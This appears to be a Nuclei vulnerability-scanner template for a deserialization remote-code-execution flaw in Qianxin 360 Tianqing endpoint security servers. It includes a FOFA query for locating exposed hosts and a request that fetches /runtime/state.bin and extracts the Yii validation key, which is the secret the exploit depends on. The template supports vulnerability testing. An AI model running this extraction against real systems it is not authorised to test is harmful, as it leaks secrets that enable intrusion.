id: qianxin-360-tianqing-state-rce
info:
  name: qianxin-360-tianqing-state-rce
  author: unknow
  severity: critical
  description: 360 天擎 YII_CSRF_TOKEN 反序列化远程代码执行漏洞。py脚本看本文件。
  tags: qianxin,rce
  metadata:
    fofa-query: title="360新天擎" || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360" || title="360天擎" || title="360天擎终端安全管理系统"

http:
  - raw:
      - |
        GET /runtime/state.bin HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15  

    extractors:
      - type: regex
        name: key
        part: body
        group: 1
        regex:
          - "Yii.CSecurityManager.validationkey\";s:32:\"(.*?)\";}"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1==200 && contains(body_1, "Yii.CSecurityManager.validationkey") && contains(header_1, "application/octet-stream")'

